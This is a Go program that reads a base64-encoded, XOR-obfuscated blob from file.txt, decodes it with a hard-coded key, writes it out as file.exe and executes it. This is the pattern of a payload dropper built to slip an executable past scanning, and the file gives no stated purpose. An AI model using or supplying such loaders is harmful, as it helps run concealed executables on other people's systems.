package main

import (
	"encoding/base64"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
)

func main() {
	// Read the contents of the file.txt file
	encoded, err := ioutil.ReadFile("file.txt")
	if err != nil {
		log.Fatal(err)
	}

	// Decode the encoded file from its base64 value
	decoded, err := base64.StdEncoding.DecodeString(string(encoded))
	if err != nil {
		log.Fatal(err)
	}

	// XOR-decode the decoded file using the secret key "mysecretkey"
	key := []byte("mysecretkey")
	decodedBytes := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		decodedBytes[i] = decoded[i] ^ key[i%len(key)]
	}

	// Write the decoded file to a new file
	err = ioutil.WriteFile("file.exe", decodedBytes, 0644)
	if err != nil {
		log.Fatal(err)
	}

	// Get the current working directory
	pwd, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}

	// Run the decoded file
	cmd := exec.Command(pwd + "\\file.exe")
	err = cmd.Start()
	if err != nil {
		log.Fatal(err)
	}
}
